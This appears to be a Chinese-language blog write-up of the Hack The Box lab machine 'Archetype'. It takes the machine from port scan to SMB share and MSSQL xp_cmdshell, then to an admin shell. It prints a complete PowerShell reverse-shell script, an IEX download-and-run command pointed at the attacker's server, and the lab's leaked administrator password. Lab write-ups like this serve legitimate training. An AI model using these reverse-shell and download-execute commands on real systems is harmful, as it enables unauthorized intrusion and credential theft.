---
layout: post
title:  "[Starting Point]Archetype"
date:   2021-02-01 11:30:00 +0800
categories: HTB
---

## 前言

心血来潮想试试一些国外的CTF网站试试，然后想起来HTB一直都没有开始，于是在B站看了一下视频打算上手玩一下。

## 准备

账号的获取不用多说，网上教程有一大堆，我这里简单讲一下openvpn，这个东西是在linux命令行里面直接跑的，在HTB获取`example.ovpn`的pack之后，直接:

```bash
openvpn <example.ovpn> 
```

最后检查一下能不能ping通那个IP

自己的IP也会变，会被分配一个虚拟网卡

![Snipaste_2021-02-01_11-53-48](..\images\Snipaste_2021-02-01_11-53-48.jpg)

## 信息收集

我做的这个是HTB的新手教程靶机，每一步都有tutorial，因此只要跟着步骤来就可以了

首先是nmap扫描IP的端口

这里用到的命令是

```bash
nmap -sS -sC -sV -T4 -vv <指定IP>
```

用这个可以探测到端口的服务

最后把得到的信息收集起来

```
opened ports:
445
135
139
1433
Host script results:
|_clock-skew: mean: 2h56m05s, deviation: 3h34m41s, median: 1h20m05s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53066/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42521/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45578/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48474/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-31T19:06:00-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-01T03:06:03
|_  start_date: N/A
```

## 漏洞探测

由于445(SQL Server)和1433(SMB)端口被打开，那么首先从这两个端口入手

![Snipaste_2021-02-01_12-00-12](..\images\Snipaste_2021-02-01_12-00-12.jpg)

## 漏洞利用

可以连接backups，进去之后用get下载里面的文件

![Snipaste_2021-02-01_12-01-53](..\images\Snipaste_2021-02-01_12-01-53.jpg)

可以得到SQL Server的账号密码

使用impactet工具集访问SQL Server

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@<IP> -windows-auth
```

之后输入密码 连接上SQL Server，依次执行如下命令

```bash
 EXEC sp_configure 'Show Advanced Options', 1; 
 reconfigure; 
 sp_configure; 
 EXEC sp_configure 'xp_cmdshell', 1 
 reconfigure; 
 xp_cmdshell "whoami" 
```

可以发现已经拿到了一个简单的命令执行

试着反弹shell

创建shell.ps1

```powershell
 $client = New-Object System.Net.Sockets.TCPClient("<你的IP>",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```

然后打开自己的服务器

```bash
 python3 -m http.server 80 
```

打开nc 开启443端口监听

```bash
 nc -lvnp 443
```

修改入网规则

```bash
 ufw allow from 10.10.10.27 proto tcp to any port 80,443 
```

在SQL Server中执行反弹shell命令

```bash
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<你的IP>/shell.ps1\");" 
```

![Snipaste_2021-02-01_12-35-24](..\images\Snipaste_2021-02-01_12-35-24.jpg)

成功反弹回来，这里可以拿到user的flag

![Snipaste_2021-02-01_12-36-36](..\images\Snipaste_2021-02-01_12-36-36.jpg)

使用下面的命令访问PowerShell历史记录文件。

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```

得到管理员密码

```powershell
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

使用impacket的psexec.py拿到win的管理员权限shell

这里有个坑，直接执行example下面的文件会提示缺少包，需要把包复制一份导入到example中才行

![Snipaste_2021-02-01_12-42-06](..\\images\Snipaste_2021-02-01_12-42-06.jpg)

最后在Desktop处拿下root的flag

结束！